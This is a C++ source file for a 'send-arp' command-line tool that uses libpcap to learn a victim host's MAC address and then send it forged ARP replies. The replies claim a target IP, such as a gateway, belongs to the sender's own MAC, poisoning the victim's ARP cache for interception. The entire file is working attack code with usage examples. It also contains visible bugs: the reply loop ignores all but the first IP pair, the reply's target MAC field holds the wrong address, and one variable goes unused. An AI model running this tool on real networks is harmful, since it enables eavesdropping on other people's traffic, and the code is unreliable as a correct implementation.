#include <iostream>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int GetMacAddress(char *ifname, uint8_t *mac_addr, char* ipstr)
{
	struct ifreq ifr;
	int sockfd, ret;
	sockfd = socket(AF_INET, SOCK_DGRAM,0);
	if(sockfd<0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
	ret = ioctl(sockfd,SIOCGIFHWADDR,&ifr);
	if (ret < 0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data,6);
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
	printf("My Ip %s\n",ipstr);
	Ip hostt = ntohl(Ip(ipstr));
	std::cout << std::string(hostt) << std::endl ;
	//printf("My Ip %s\n",std::string(hostt) );
	close(sockfd);
	return 0;
}

int main(int argc, char* argv[]) {


	if (argc %2 !=0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


	char ip[2000];
	uint8_t myMac[6];
	GetMacAddress(dev, myMac, ip);
	printf("ip : %s\nmac : %02x:%02x:%02x:%02x:%02x:%02x\n",ip,myMac[0],myMac[1],myMac[2],myMac[3],myMac[4],myMac[5]);

	
	int sss = 0;
	
	for(sss=0; sss<(argc-2)/2; sss++){
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(myMac);
	packet.arp_.sip_ = htonl(Ip(argv[2*sss+3]));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2*sss+2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	struct pcap_pkthdr	*header; 
	u_char *pkt;
	while((res = pcap_next_ex(handle, &header, (const u_char**)&pkt))>=0){
		if(res==0) continue; 
		struct EthArpPacket *response_packet = (EthArpPacket *)pkt; 
		//printf("type %x\n",response_packet->eth_.type()==EthHdr::Ip4);
		//printf("if same %d\n",response_packet->eth_.dmac()==myMac);
		if(response_packet->eth_.dmac()!=myMac) continue;
		if(response_packet->eth_.type()!=EthHdr::Arp) continue; 
		//printf("arp type %x\n",response_packet->arp_.op());
		if(response_packet->arp_.op()!=ArpHdr::Reply) continue; 
		//printf("wrf??\n");

		EthArpPacket cutePacket;
		packet.eth_.dmac_ = Mac(response_packet->eth_.smac());
		packet.eth_.smac_ = Mac(myMac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(myMac);
		packet.arp_.sip_ = htonl(Ip(argv[3]));
		packet.arp_.tmac_ = Mac(myMac);
		packet.arp_.tip_ = htonl(Ip(argv[2]));
		int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res1 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		break;
	}
	}
	pcap_close(handle);
}
